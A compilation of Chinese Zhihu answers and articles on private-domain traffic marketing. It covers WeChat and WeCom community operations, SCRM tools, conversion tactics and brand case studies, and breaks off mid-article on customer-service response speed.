在分享的最后，徐志斌老师说： 太阳底下无新鲜事，我们现在所说的社群、私域，其实归根到底，是如何通过运营获取特定的人群，将陌生、潜在的新用户逐级变成超级用户，将陌生人凝结成更强的关系网。 私域不是一件特别需要焦虑的事情，相反，他很简单。只是运营起来需要反复操心，也需要思考一个问题：自己业务的长板是什么？如何借助私域提升效率。大部分公司私域的起步都是和自己运营长板相结合。想通之后，再考虑用什么工具（SCRM），策略和方式。 找好用的私域运营（SCRM）工具，就来36氪企服点评： 支持产品功能、客户规模、用户评分、满意度、排行榜等分类筛选查看相关软件，另外还有软件对比等更多功能，点下方链接即可查找适合自己的SCRM产品。 企业客户关系管理（SCRM）系统_私域流量运营_SCRM软件公司_-36氪企服点评 文章详细url:https://api.zhihu.com/answers/2903587226做“私域运营”就一定要用“微信”吗？内容不一定，但最好用微信或者企业微信； 私域化是一种能够低成本触达，提高用户生命周期价值的行为； 私域化需要的平台要具备一下属性： 1.用户本身在该平台的停留时间足够长，用户使用频次足够高； 大概率不能自己研发一个app吧？停留和活跃现在又有谁能超过微信？ 2.积累的私域用户，需要概率最小的的平台竞品曝光，才有优势； 有些公域有了活跃和停留，客户信息也透明了，今天看到你的产品，下一秒就“猜你喜欢”推荐类似产品，如某音。 3.你需要的私域品平台精细化分层管理客户，标签，备注，仅对谁可见，接入SCRM等； 4.触达不要钱，且触达的平台会强提醒被触达方。（反正我是任何软件通知都会关，支付宝和微信的消息通知我不会设置免打扰。） 5.客户会大量主动在平台分享个人生活信息，且主动打开你发广告的触点渠道去浏览，因为他的朋友圈不止有你。 符合这些点，不是说非得微信，但目前有谁能强过微信呢？ 感觉有问题，评论一起聊聊； 觉得没问题，点个赞呗～ 文章详细url:https://api.zhihu.com/answers/3006592994私域运营模式有哪些？内容我们先明确下私域的定义，每个人对私域流量池的看法不同。有的人把它理解成一种新的流量方式，有的人把它理解成一个用户池。 其实，如果真要给“私域流量池”做一个界定，那它的本质并不是流量，而是用户的精细化运营。私域流量池里的用户都是自己可以反复利用，可以免费触达的，这些用户沉淀在微信公众号、微信群、微信个人号、企微号等平台，我们称之为私域流量池。 企业私域运营基础搭建按照一般私域运营模式，主要分为三个部分： ①销售/服务前台：属于企业各部门中最贴近用户、最了解业务的一部分，要有承接规模化私域客户的能力、深度服务私域客户的专业度； ②市场/运营中台：主要职能应是提供前台的私域运营策略，解决前台提出的运营技能型问题。需要能熟练策划获客活动、输出内容SOP、客户群促活SOP等，对市面上的社群工具、裂变工具、SCRM工具要有充分的了解，持续为前台部门提供获客、留存、转化的方法论； ③技术/支持后台：能够快速响应中台部门的需求，将个性化的私域运营策略通过技术手段更高效的落地，实现营销自动化和数据化。一切的增长运营和私域运营，都是建立在数据分析的基础上。 1、私域运营的全员策略做私域运营，最常用的方式，是进行用户的企业微信及社群沉淀。涉及到员工头像、昵称、企微朋友圈、绑定视频号、用户标签、用户路径追踪、用户跟进、话术库搭建、商品图册搭建等。 比如IP昵称的设定，要易记、业务相关、便于搜索、定位明确等；而企微头像要尽量避免LOGO化，可采用真实员工生活照或企业统一风格形象照；添加后的欢迎语要能清楚的传递企微号的定位和价值，以及如何破冰等等。 2、私域运营的IP定位一般企业的全员私域运营，可分为三种角色： ①企业的首席用户福利官：主要以活动发布、福利推送的标准化服务为主，通过小程序、公众号、社群等一对一、一对多推送。 ②KOC型的种草型分享达人：丰富品牌触达场景，增强产品的社交讨论属性。 ③深耕本领域的行业专家：分享专业、权威的接地气干货内容做好全方位服务。 以上三点其实包含了4个环节：引流钩——引流中——引流转化——转化后服务，都是以本行业为蓝本，可能不具有普适性。 二、私域运营转化大部分用户没有在私域内消费的习惯。当下用户购买的行为主路径依次是：接受产品信息——产生购买需求——做出购买决策——下单付款。而在私域流量中，就是如何做一个重度客户的运营，挖掘单客价值，建立客户信任的线上成交模式。这个过程中怎么突破信任感建立起关系对每一个做私域的项目操盘者来说是需要突破的。 1. 套用平台的优惠活动，促进新用户完成首单体验我们可以让用户完整的体验到我们私域的购买路径，让用户体验到产品购买的Aha时刻。而我们要如何撬动用户完成私域的第一单，主要还是基于私域的人设去打造。从添加用户那刻起，一定要让用户知道我们是真实存在的人，需要让用户知道我们是干什么的，能给他带来什么样的价值，解决什么问题，这一点也是私域操盘手必须要去解决的问题。怎么样能够让用户在最短的时间内和我们建立关系达成信任。 接下来套用做平台的方式，比如9.9元包邮、1元购、限时秒杀、发新人券、三人拼团、买一赠一等通过补贴的方式，只针对新用户去让他们完成首单体验，尽量在三天之内完成，或者更短的周期内完成。 2. 做闪群、做直播、做朋友圈活动也可以通过做闪群、做直播，做朋友圈活动来去把首单尽快完成掉，这里需要操盘手能够有一套完整的新人转化策略。成交场景尽可能使用小程序商城或者H5商城去做首单转化，现在微信也有自己的商城让用户能够完成微信购物的首次体验。需要注意的一点是 私域的首单一定要有特权感和差异化，简单的说就是让用户要买到我在平台店铺里买不到的商品或者是权益。这样用户加到我们的私域当中才有意义和价值，在完成首单转化之后你也会拿到这个用户的基本信息数据，就可以在接下来做一些定制化的服务和推送了。 操盘手需要看你设定的新人首单的活动机制和玩法是否能够真正的吸引用户完成首单了， 我们需要检测新用户下单率和补贴成本核算，要做的就是要把控新人首单转化的活动效果，来不断的做优化和调整。在私域这个场景里面，有哪些可以持久转化的策略和手段。 三、总结其实对大部分企业来说，做私域运营挺难的，难的不是团队的搭建、不是引流策略的实施，而是整个企业从上至下需要意识到它很重要，并付诸强大的执行力去落实。 文章详细url:https://api.zhihu.com/answers/3212177845企业为什么要深耕私域流量池？内容原因主要有以下几点： 1.增强品牌影响力：通过在私域流量池中与用户建立紧密联系，企业可以更好地传递品牌价值，增强用户对品牌的认知和信任。同时，私域流量池可以为企业提供更直接的市场反馈，帮助企业更好地了解用户需求和反馈，进而优化产品和服务。 2.降低获客成本：私域流量池中的用户是企业通过各种渠道获取并经过筛选的潜在客户，这些用户对企业产品或服务有较高的兴趣和需求。与在公域流量中通过广告投放等方式获取新客户相比，深耕私域流量池可以降低获客成本，提高营销效率。 3.提高用户粘性和复购率：通过在私域流量池中与用户建立长期、稳定的关系，企业可以更好地了解用户需求和偏好，为用户提供更个性化的服务和体验。这有助于提高用户粘性和复购率，同时也有助于提升用户满意度和口碑。 4.优化用户全生命周期管理：私域流量池可以帮助企业优化用户全生命周期管理，包括用户的引入、培育、转化、复购等环节。通过在私域流量池中与用户进行互动和沟通，企业可以更好地了解用户需求和反馈，进而优化产品和服务，提高用户满意度和忠诚度。 5.提升企业运营效率：通过深耕私域流量池，企业可以更好地了解用户需求和反馈，优化产品和服务，提高运营效率。同时，私域流量池可以帮助企业更好地掌握市场趋势和变化，及时调整经营策略和产品定位，提高企业的竞争力和适应性。 私域流量是近几年非常火的概念，简单来讲就是直接接触客户，运营客户，积累客户群，也就是私域流量，常见的有社群运营、会员运营等。 而私域流量的作用，或者说私域流量多的优势，其实都是相对公域流量来说的。近几年的公域流量成本越来越高，转化率欠佳等原因，让品牌方开始聚焦私域流量。 简单来讲，私域流量不仅影响成本更低，还可以直接触达消费者，有助于企业分析消费者的相关数据，再反哺企业的产品开发、优化和公司的各种决策，是一个一举多得的事情。 这篇回答和大家详细讨论一下： 私域流量是什么？私域流量有什么优势？私域流量怎么运营？私域流量相关案例 1.私域流量是什么？私域流量可被定义为沉淀在品牌或个人渠道的，可随时及反复触达的，能实现一对一精准运营的用户流量。私域流量营销指通过引流用户到私域、满足用户需求、运营用户关系以实现产品或服务交付与品牌收益增厚的组织功能或手段。 私域流量一般是指品牌、商家或者个人所拥有，客户可以持续多次被使用的流量。与之对立的，是公域流量，公域流量一般是指在类似于百度、天猫、头条等流量聚合平台下，平台通过算法，以及你通过购买，或者是 SEO 优化等运营手段而获得平台分配给你的访问流量。 私域流量一般来说是有载体的，我们常见的个人的微信号，QQ 群，微信群、企业的微信公众号、服务号，抖音，微博号，都是私域流量的载体。 当用户加了你的好友，进入到你的社群内，关注了你的公众号，服务号，抖音微博，相当于进入到了你的载体内，当用户达到一定的基数，产生了流量，有了变现的可能，这种流量就叫做私域流量。 2.私域流量有什么优势？性价比高：向这些用户展示，推荐信息，是不需要额外付费的。持续性强：只要用户不离开，你可以持续的向用户来推荐，展示信息。双向交流：这种流量是可以互动沟通的，你与用户之间的关系，是平权关系。稳定性强：用户用完不走，仍然还会在你的平台内。 3.私域流量怎么运营？大家可以看看这篇文章：私域流量运营的几种方式 这里简单提一下私域流量运营的打法，感兴趣的朋友可以点击链接阅读原文。 （1）第一招：直播+社群+小程序+私域流量从疫情爆发到现在，很多零售实体商家加速入局线上私域电商，通过线上的直播电商和社群营销带动线下门店，提升门店客流和销售，几乎成为了实体企业谋求增长的刚需。 “直播+小程序+社群+私域门店”组合成为当下运用最多的打法，这几乎成为零售行业的标配。 （2）第二招：直播+社群&#x2F;微商城&#x2F;小程序打法将直播变成获取流量、促进购买转化的重要工具，直播间的观众、产生购买的顾客则沉淀到社群/微商城/小程序中去，将这些玩法变成私域流量运营的重要动作，这些动作将直接影响到下一次直播的效果。 如企业可通过门店推广、导购员推广等方式为直播间引流，在直播间可以推送给顾客微信群二维码，吸引直播间粉丝关注，沉淀出私域流量，平时通过拼团、秒杀等社群活动促进活跃和购买转化。 （3）第三招：三大主流“直播”模式打法模式一：通过直播门户平台载体如快手、抖音、西瓜、火山等，短视频主流直播平台。 利用KOL/KOC网红在主流直播平台的自带流量，以直播形式引导消费者到京东、天猫、苏宁等电商渠道完成购买，需要品牌方同时在电商渠道配合做效果类促销，物流配送也走电商渠道平台通道。 或者由主播团队在直播界面上架商品，并引导消费者至平台内嵌电商页面（类似淘宝店商家购买界面）完成购买，但需由商家自己或代运营服务商完成物流配送，更类似淘宝商家售货模式。 模式二：通过电商平台的直播板块载体如京东、天猫、苏宁等电商平台的内建直播板块。 邀请KOL/KOC网红，或由品牌负责直播营销的同事，进驻品牌在电商平台上开设的旗舰店、线上商铺的直播间，以导购直播的形式引导消费者完成购买，品牌方同时在直播间内配合上架效果类促销活动，最终通过电商平台完成后续物流配送。 模式三：通过微信小程序直播功能载体如自建微信小程序。 依托微信生态，结合公众号推文、微信群、朋友圈、朋友圈广告等导入品牌自建微信小程序，邀请KOL/KOC网红，或由品牌负责直播营销的同事，利用小程序直播功能，以导购直播的形式引导消费者购买，品牌方往往在小程序直播间配合上架效果类促销活动，消费者通过小程序构建的微商页面完成交易，最终由品牌商家自己或代运营服务商完成物流配送。 由于疫情令品牌的营销工作由线下转为线上，可以预期2020年下半年，大量品牌商家在增长压力下，营销预算不可避免将在线上通路扎堆儿释放，也势必导致公域流量获客愈加昂贵，基于品牌自身私域流量池资源就势在必行。 （4）第四招：企业微信+小程序+直播+社群（5）第五招：企业微信+不同人设组合（6）第六招：微信广告引流直接添加企业微信导购（7）第七招：社群运营+私域流量新打法因篇幅过长，感兴趣的朋友可以点击链接阅读原文： 创新实践 | 我们梳理出最新的7种私域流量打法 4.私域流量相关案例（1）案例一：喜茶会员DTC如何积累3500万私域流量实现弯道超车？传统的商业思维似乎无法解释喜茶的胜利。在一众各有千秋的同行者之中，喜茶凭什么更受资本关注？其一是喜茶会员DTC的数字化营销已成为茶饮行业的兵家必争之地。其二则是产品的竞争，已渐渐趋于供应链数字化程度的竞争。另一方面，流量越来越贵已是必然的趋势，自建私域流量池是喜茶会员DTC必然的未来。 （2）案例二：私域流量运营 | 积累4200万私域会员，“孩子王”们的「运营打法」值得借鉴进入“留量时代”以后，企业增长越来越难，拉新成本也越来越高。 “现在的拉新成本，已经达到 20 年的 3 倍以上。” 如何做好私域流量运营“，挖掘“留量用户剩余价值”，成为每一个企业都在思考的问题。 那些「 私域会员运营 」做得好的品牌，大多在「留量时代」过得风生水起，甚至成为行业头部……今天这篇文章就来谈谈，在「留量时代」，企业如何做「私域会员运营」？ （3）案例三：创新案例｜从社媒引流到私域复购的完美日记增长8个月实现50倍完美日记增长有多疯狂？8个月实现50倍销量增长，超过兰蔻、YSL等国际大牌。本文高度提炼完美日记增长 的关键两点：垂直社群KOL投放+私域流量精细化运营提升复购率。这一切都是完美日记对DTC（direct-to-consumer）的运用…… （4）案例四：创新案例｜中国DTC品牌瑞幸咖啡绝境重生逆势增长的三大运营策略瑞幸咖啡仅用短短18个月时间从品牌创立到纳斯达克上市，刷新全球最快上市记录。2020年因交易造假事件被勒令退市股价暴跌80%，有人说这个创造了赴美IPO奇迹的“巨婴”将是下一个倒下的ofo。2022年瑞幸咖啡以逆势超速增长领跑咖啡赛道有力回应了市场的质疑，其浴火重生经历堪称中国商业史又一个奇迹，那么究竟发生了什么让瑞幸绝境重生？ （5）案例五：创新案例 ｜拆解估值1000亿元气森林DTC的3大创新营销策略元气森林渠道创新，以明星单品+线上营销实现快速突破，产品验证后，通过品类扩充和线下渠道推广，网格化实现规模化增长。 5.扩展阅读（1）创新研报 | 从“试水”变为“必要”选择——后疫情时代的私域流量营销 在疫情时代，线下流量锐减，企业数字化转型的意愿进一步加强，并且数字化工具也不断升级迭代。 私域流量营销 作为红利趋缓、预算优化及精细运营下的营销选择，成为市场营销新风口。波士顿咨询的研究显示,2020年微信小程序日活用户突破4亿,小程序商品交易成交金额(GMV)同比增长达115%。各项数据显示,经营者利用私域流量进行品牌营销已具备现实基础，而私域流量确实已成为当下最受追捧的营销模式之一。 这份《2021年中国私域流量营销洞察研究报告》由艾瑞咨询出品，从发展背景，品牌主洞察，产业链分析，趋势展望四个方面分析中国私域流量营销，以期对市场认知提供一定参考，对有需求进行私域流量布局的企业提供指导。 点击阅读全文 （2）中国私域流量营销洞察研究 DTC模式的兴起和新冠疫情对数字化转型的推动了 私域流量 营销发展，私域数据融合打通后将成为企业数字化建设的重要资产。 未来私域流量将会有渠道一体化，营销场景化和运营智能化的趋势。流量红利增长趋缓，公域平台用户维护及获取成本升高，dtc 模式兴起，营销媒介与销售渠道走向统一。 私域营销基于强信任感与强链接性，内容将成为增长新引擎。 私域流量 营销的核心角色是技术服务商，其涉猎服务场景丰富，覆盖功能广泛。私域建站服务商收入规模稳增，私域渠道变现潜力可观。 点击阅读全文 （3）深度干货丨私域流量是什么？ 私域流量打造的四大底层方法 近些年私域流量这个话题突然火爆起来。很多企业言必提私域流量，分析原因，主要是因为公域流量的成本越来越高。易观数据显示，从2014 年之前，阿里获客成本不超过 30 元/人，到2018年，阿里京东的获客成本迅速攀升至超过300元/人。 在外部流量成本不断升高，运营难度不断加大的情况下，不论是电商平台，还是企业都开始关注起私域流量这个话题，今天笔者就和大家讨论一下，关于私域流量的一些问题，和底层的运营逻辑。 点击阅读全文 （4）创新趋势｜2023中国消费品行业渠道数字化转型洞察 不论是“百年变局”、“新零售DTC”，还是“最理性‘双十一’”，近年来有关消费品行业的各色叙述都在传递一个信息——中国消费品行业正经历新一轮市场考验与行业变革。在此背景下，消费品行业的渠道数字化转型成为突围关键。 消费品行业的渠道数字化转型，背后是渠道模式的演进。品牌方角力重心从过去增量市场下的商品与供应链能力比拼，转向存量市场下如何更精准理解和把握市场需求。 因此，品牌方、经销商与消费者之间的价值链条发生重构，呈现出渠道数字化转型的三条变化主线：渠道模式之变，触点打法之变，渠道运营之变。 点击阅读全文 （5）私域增长 | 私域会员：9大连锁行业15个案例集锦 在见实刚刚发布的“会员×私域”主题白皮书中收录了9大连锁行业26个私域会员案例。这些案例涉及的9大行业分别为：餐饮、美妆、珠宝、鞋服、商超百货、零售、母婴、酒店、茶饮。笔者在白皮书撰写过程中对这些案例进行了一一梳理，也是基于再消化的过程，才有了后来白皮书的定调——“会员运营某种程度等同于私域运营”。 点击阅读全文 （6）私域裂变｜让人又爱又恨的用户增长法 私域流量的用户规模是各品牌企业投入私域运营时最关注的目标之一，除了上次文章分享的私域引流之外，另一种提升私域用户规模的方式便是私域裂变。但是，私域裂变也是让人又爱又恨！ 一方面，私域裂变活动能够充分利用私域存量用户的分享价值，利用用户的社交关系链获取新用户，高效提升私域用户规模，是必要的私域运营模块。 另一方面，私域裂变活动是对用户信任关系和社交关系的消耗，拉新增长效果具有限制，ROI逐渐降低，并且易导致负面的用户体验。 正视私域裂变是做好裂变的前提，不盲目推崇，也不无视放弃，用好私域裂变对私域运营仍大有裨益。本文是私域流量系列文章第3篇，和你分享私域裂变的运营心法。 点击阅读全文 （7）趋势策略｜2022私域拉新增长的5大SEO优化策略 2022私域拉新获客成本持续攀升，最经典的有机获客增长打法SEO优化被重新获得空前的重视和更高的优先级，无论是B2B自建网站还是DTC自营电商，越来越需要精准持续的引流获客。搜索引擎优化SEO趋势每年都在变化，私域增长运营必须自我更新才能不断跟上。 本文就是您在寻找2023年要遵循的正确搜索引擎优化趋势策略！ 点击阅读全文 查看 1000+热门创新案例 请进入创新社区 文章详细url:https://api.zhihu.com/answers/3290994084私域流量已经成为趋势了吗？内容私域流量已经成为趋势了吗？自信点，把吗字去掉，私域流量已经成为趋势了。 为什么呢，因为随着互联网的发展，越来越多的线下门店转移到线上，即使线下门店营业，也是线上线下同步运营。 而且线上的很多玩法是线下不具备的，因为线下经营会受到成本的制约，而线上运营不仅大大减少了运营成本，包括门店租金、员工薪资、水电费等，更重要的是，线上运营极大的扩展了触达潜在用户范围的能力。 所以线上运营的力量不可忽视。 那么回到题主问题，私域流量，就是要把公域流量用户转化为忠诚度极高的私域流量用户，等于是把随便逛街的顾客转化成出来逛街只去你一家店，那潜在盈利是巨大的。 所以一定要建设维护好私域流量，包括社群运营、活动运营，用户运营等等。 文章详细url:https://api.zhihu.com/answers/3098782792私域运营有哪些雷区？内容谢邀。私域运营雷区个人认为有三点: 1.）认为给礼品，用户参与了就是成功。其实，非常错误。如果发的礼品与你的正价品不匹配、对用户来讲，就是反宣传、也不利于将吸引上来的人进行后续的转化。比如:你是卖面包的、但是赠的礼品却是写作课程。这在用户心理就会产生认知混乱，搞不清你是做什么的。 2.）回复要及时。要知道用户来找你，也就是看了宣传内容之后突然的想法、需求刚被刺激出来的时候，所以一定在用户需求特别急迫或者刚刚产生的时候，进行回复。来咨询的用户千万别晾着，凉了以后付费意愿会更低、更无法转化。 3.）私域运营就是聊微信、拉群做活动。其实，留手机号的客户、进门店的客户、线下、自己app上的客户……凡是你随时能随时触达且其他企业触达不到的客户，都算是你的私域资产，都要好好维护。 4.）一味送礼。要算清Roi。有成本把控意识。 文章详细url:https://api.zhihu.com/answers/2777312246到底什么叫作私域？如何开始去做私域？内容一、到低什么叫私域 首先私域是什么？在了解私域之前我们先捋清楚公域流量是什么？公域流量也叫平台流量，主要的公域流量平台有抖音、腾讯、快手、百度等社交媒体平台。而私域简单来说就是自己所掌握的流量，主要包括粉丝人群和社交人群等，指从公域、其他域（比如平台、媒体渠道、合作伙伴等），引流到自己的私域，以及私域流量产生的裂变（激励分享）。私域流量是你可以直接拥有的、可裂变、低成本甚至可以免费触达的流量，比如微信公众号粉丝、微信好友和微信群、视频号粉丝、抖音和快手粉丝等。 二、为什么做私域 现在很多人都说做私域其主要原因就在于流量获取成本越来越高，而且各个公域流量平台的竞争程度越来越高无疑也加剧了这种流量获取难度和成本，从而倒逼很多客户开始做私域，把从公域引进来的流量留存到自己的私域。而且在私域流量达到了一定的规模就可以逐步摆脱公域流量的限制，利用自身私域流量的裂变达到更低成本的流量获取。 私域流量的人群一般都是对于本产品有兴趣的人群，所以都是比较精准的人群，相比于公域的泛人群来说转化率会高很多，所以利用私域流量推广产品的成本很低，很适合用来测品。如果自身私域流量都对本产品（和私域人群画像相符的产品）不感兴趣，那在公域流量也很难产生较高的转化。 私域运营是一种新型的流量运营模式，更加强调流量的留存率和互动分享，同时也需要公域和私域的协同发展，公域引流私域运营，严格来说私域运营也是一种客户管理。我们通过社交媒体平台（如抖音、快手和微信视频号等），通过在这些平台投放广告产生较大的订单信息，然后再通过添加下单客户的微信，通过微信的社交能力进行客户运营（通过售后服务和优惠券促销活动），引导他们进入自己的小程序商城购买或者关注自己的自己的视频号等，这样就就把公域流量一步一步的去转化成了私域流量。 三、如何开始去做私域 那么在我们了解了私域和公域的区别以及私域到底是什么之后呢，我们就回想，那怎么开始做私域呢？下面也总结了如何打造私域流量的五个步骤，还有老板最关心的私域流量到底是怎么去运营的问题，都会呈现出来哟。 我们在打造个人私域流量时最关键的【五个步骤】‍ 第一步: 建立私域流量池(去公域流量持续输出优质内容，引到我们的私域流量池。微信好友) 第二步: 裂变。两个方法、一个是私域流量里的人带流量进来;二个是破圈，花钱去跟人接触，交换价值。学会演讲，扩大自己的影响力。可以连麦直播，去破圈。然后要做留存。 第三步: 留存。怎么去留住别人呢?1、细分化人群管理。做标签，标签化管理。什么时候认识的，喜欢什么，有什么特点。 2、注意自己的选择，选择大过努力。慎重选择自己的渠道和产品。第四步:转化。私聊转化，朋友圈转化，社群转化。第五步:当你的个人IP还没有什么知名度时，你要做的是\"持续主动积极地发声\"。 你不一定得主动做新增动作，但你可以输出有价值的内容，吸引别人来加你。 靠微信生态赚钱的人，如果你只是个不说话的小透明，那没有半点机会可言。 最后，私域流量的运营始终围绕着信任展开，信任的建立靠 2 方面：1.人设打造，让用户认可你；2.精细化运营，让用户觉得你“懂”他。‍ 在我们了解了私域，了解了如何打造私域之后，接下来就应该了解如何运营私域。 私域流量运营过程中，如何转化的关键因素： 第一定律就是私域流量不是做一锤子买卖，一定要牢记。1、了解客户心理：不管客户是从什么途径添加企业微信（公众号等），一般都会存在观望的心态。这时候，要主动接触客户，告诉客户你是做什么的，能给他带来什么价值。2、谈需求，谈感情：客户对企业和产品有一个初步了解后，会产生购买、继续观望以及不感兴趣三种态度。对于前者，要持续跟进，挖掘其他需求点；对于后者，则要拉近距离，打感情牌（比如朋友圈点赞评论）。3、做限时促销活动，制造紧迫感，提升转化率：促销活动针对的是已购买用户、加购但未付款客户以及持续观望客户，可以促成交量。 不过，100%的转化率是最理想的状态，微信中难免躺着一些不管怎么努力触达，都从不回复的客户，这类大概率是对企业/产品不感兴趣的用户，可以统一分组，隔段时间提醒发放消息，期待客户唤醒。‍ 这就是今天关于私域流量非常全面的一个介绍了，想必各位老板绝对仔细看了下来，无论是不懂私域想了解私域的，还是不知道怎么打造私域的，又或者是不清晰私域流量运营的关键是哪些的，都可以在这篇私域流量的基本介绍里找到答案。 后续我们还会在公众号，持续去发一些关于私域流量尤其是运营方面的干货！！！关注公众号，不怕迷路哟~‍ 文章详细url:https://api.zhihu.com/articles/648490221品牌要不要进行私域营销？内容将这个问题转化为品牌要不要做私域营销。 答案是：要。 但不一定要成为可变现的私域流量。 什么是私域？在PC时代，商家无法直接触达自己的消费者，因为用户都是属于平台的。商家只是平台的广告主和商品搬运工，每付一次广告费才能产生一笔订单，就像每月付租的房客。 但在移动互联时代，商家可以通过微信、微博、快手、抖音等工具直接触达到消费者，这就形成了“私域”，代表着商家不再只是某平台的租客，而拥有了自己房子，有了产权。 为什么品牌要做私域呢？因为，私域为品牌提供了可重复、低成本甚至免费触达用户的场域，这让高频地与目标受众接触和互动和快速而又直接地展示商品、营销活动和品牌文化成为了可能，更便于品牌拉近与目标受众的距离。 对品牌来说，这能带来以下益处： 1、直接售卖，提升销售业绩： 品牌可以直面消费者，用无中间商赚差价省下来的成本可用于发起促销活动，提供更优惠的价格来劝说消费者购买，有助于增加商品服务的销售，从而提升销售业绩； 2、增强用户粘性，培养品牌忠诚： 通过叫高频词的适度的与用户的直接互动沟通，可以增强品牌的存在感，强化用户对品牌的了解，让用户更真切地感受到商品和服务的品质、有吸引的品牌文化、对用户的用心关怀，拉近彼此间的距离从而增进用户粘性，更加认可品牌从而建立忠诚； 3、积累用户数据，开展更科学更精准的市场营销： 结合门店销售终端、社群、企业微信、线下POS、APP等的私域数据与公域数据汇总起来，可以建立企业专属的大数据CDP，制定更丰富立体的企业目标客户和在用客户的画像系统，并可以利智能分析工具辅助科学决策，实现从产品设计研发、生产制造、物流、终端销售和促销推广的精准化、精细化，提升市场营销工作的效率。 因此，私域营销做得好让品牌能够有机会，以更低的成本精准触达目标用户，在转化变现增加销售、提升利润的同时增进用户对品牌的了解和认可，提升品牌形象、深化品牌忠诚，推动品牌营销体系整体效能的提升。 不过，私域营销这么重要，但不是所有品牌都需要大力投入去转化私域流量变现。因为，私域营销需要针对用户开展个性化的营销活动、重策划、重内容、重执行把控，即使有了数字化工具的辅助，也需要较高的人力成本投入才能保证较好的效果。 品牌需要平衡好通过私欲营销所需人力成本和所换回来的销售变现。这是因为商品服务的品类、用户的需求和消费决策方式的差异性决定了，通过私域开展销售的投入产出比的差异。 如果经过评估，所投入在流量变现上的人力成本远大于销售变现，则应该量力而行不必盲目投入，但做好基本的私域营销工作，如微信公众号运营、客户群服务等，这本就是日常传播、客户服务等工作的一部分，在不增加额外支出的情况下需要结合私域针对用户的个性化需求提升工作水平。 如果经过评估，销售变现能够大于所投入在流量变现上的人力成本，则应该加大私域营销的投入，特别是要侧重流量变现，在强化营销传播、用户互动带来的品牌价值增益的同时，寻求更高的销售转化。 那么哪些品牌适合开展私域销售（私域流量变现）呢？ 一般来说，获客成本高、客单价较高、复购频率高的品牌更适合。 首先，公域的传播推广面临渠道资源稀缺、反复触达不易、影响深度不足的特点，如果要单纯通过公域促成购买，就需要想办法增加曝光量和反复触达来完成，这带来了更高的获客成本，而且有些品类的成本尤其较高，如汽车、数码产品、美妆等，其通过私域转化的成本会更低。 其次，高客单价可以更好地覆盖私域营销的人力成本投入，无论是首次销售转化还是促进复购，其投入产出比更高；同时，复购频率越高决定了前期私域运营的投入在较长的客户生命周期里能带来更大的整体回报，而且对于用户粘性和品牌忠诚的贡献更大。 按照一般的经验来说，按产品服务的品类来说来说，服饰、母婴、美妆、保健、餐饮、3C数据、家居、生鲜、办公、汽车、教育、家装建材都比较适合开展私域销售（私域流量变现）。 要做好私域营销，必须要有完整严密的营销体系的支撑，为此需要：首先，搭建私域营销平台将公域流量导入并沉淀下来。这些平台一般包括官网、微博、微信公众号、小程序、微信群等，要能留的下用户形成待开发的流量池，并通过一套合适的数字化营销系统来统筹管理这些平台并实现高效的协同。 其次，收集用户数据并绘制用户画像，为后期的科学决策和精细化营销提供支撑。其次，品牌需要通过门店终端、在线互动、公域数据库等渠道收集用户的基本特征（年轻、性别、地区、职业和收入、学历等）兴趣爱好、购买行为特征等，再根据自身的营销任务需求，绘制完善的用户画像并分析，包括用户行为分析、用户需求分析、产品分析等，为产品设计研发和营销推广提供支撑，这需要使用CDP、CRM、PLM、SCM等数字化的管理工具。 再次，要制定科学的营销策略，以提供优质的产品服务、生产有吸引力的营销内容、加强用户互动和优化用户体验。营销策略包括产品研发、品牌推广、内容营销、社交媒体营销等多个维度，需要围绕客户需求来制定针对性策略，让产品服务更好地满足需求并保证质量，提供合适的图文、视频、互动互动来吸引用户的参与，并嘉庆客服咨询、社群互动、线下活动等的水平来强化用户互动 ，深化用户的参与度、保障良好的用户体验、提升用户的满意度，以促进销售转化，并提升品牌形象和强化用户粘性。 品牌要不要做私域营销呢？要！但不同品牌要根据自身特点制定合理的私域营销目标，并开展高效的营销活动来尽量实现“品效合一”的营销效果。 都看到这里了，收藏前就点个赞吧～ 作者于《国际公关》杂志、市场部网、广告门、数英网、首席营销官等营销行业垂直媒体开有专栏个人微信公众号：品牌市场相对论 id：Brand-Marketing期待与从事品牌营销的朋友交流，欢迎关注。 文章详细url:https://api.zhihu.com/articles/662683500私域的未来，该何去何从？内容企业未来要想做好私域，服务是关键所在，得服务者得私域。 《孙子兵法》九地第十一有云：九地之变,屈伸之力,人情之理,不可不察也。 作为统帅，要以形势使屈伸之力，还要懂得观察人心。 做私域服务，亦是如此。 其一、要懂得审时度势，随机应变，沉着冷静，有应对之策，能屈能伸，谨小慎微，切不可自乱阵脚。 其二、要懂得观察人性，抚慰人心，无论是自己的员工还是服务的客户，懂人性方可有应变之策。 能够做到以上两点，私域服务何愁做不好？ 可能有人会有疑惑了，私域服务真的有那么重要吗？ 很重要，而且是势在必行。 当我们从流量思维转变到用户思维之后，私域的服务就显得尤其重要。之前我们已经说过，在流量过剩的时代，流量不是用户，不是活生生的人，而是一串串冰冷的数字，是故无需做服务，来了便转化即可。 而如今做私域切不可再把流量当数字来看待，而是一个个活生生的人，人之常情也，必要以诚相待，感动之，何愁不转化，何愁产品卖不出去？ 但是在我服务过的很多企业里，其实很多老板还是没有从流量思维转化到用户思维，在他们眼里，流量只不过就是数字罢了，今天涨了100个粉丝，明天涨了200个粉丝，用户走了其实就是数字的变化，不足为惧，不必挽留。 倘若一直都是这种心态做私域，私域又怎能做好？ 古有云，有道无术,术尚可求也,有术无道,止于术。 道即根本，道即战略，道出了问题，再好的战术，也是无济于事。 所以做私域的老板们，现在一定要转变心态，把流量当人来看，把用户当人来看，用心服务好每一个客户，此乃大道也，私域自会出奇效，望公周知。 既然私域的服务如此重要，那么应如何才能把服务做好？ 心系用户，心里时刻装着用户，急用户之所急，想用户之所想，不仅要做到锦上添花，更要做到雪中送炭，这正是做好私域服务的根本所在。 那么在私域里，如何才能真正做到心系用户？ 首当其冲的就是产品，一个好的产品就是最好的服务。 我们之前不止一次说过，产品之于私域的重要性，因为私域做的是复购的生意，倘若产品不好，又怎么能让用户心甘情愿下单并且复购呢？ 用户购买产品是为了解决自身的需求，如果连需求都满足不了，又何谈接下来的服务？ 所以，企业要想做好私域的服务，得先解决产品的品质问题，因为产品是解决用户需求的根本所在。 除了产品之外，我们在做私域的时候还会碰到以下服务的问题： 第一、私域服务之响应速度 响应速度是私域里面很小的一件事情，但是却显得尤其重要，而且在我服务过的企业里，真正重视响应速度并且把它做好的寥寥无几。 何谓响应速度？ 就是当客户发信息的时候，客服回复客户的时长。好的私域服务可以做到响应时长平均2分钟内，而做的不好的可以达到平均30分钟以上。 这就意味着什么，当你给别人发信息的时候，过了30分钟才回复你，你要是不着急还可以忍，倘若你很着急，别说30分钟了，5分钟你都恼了。 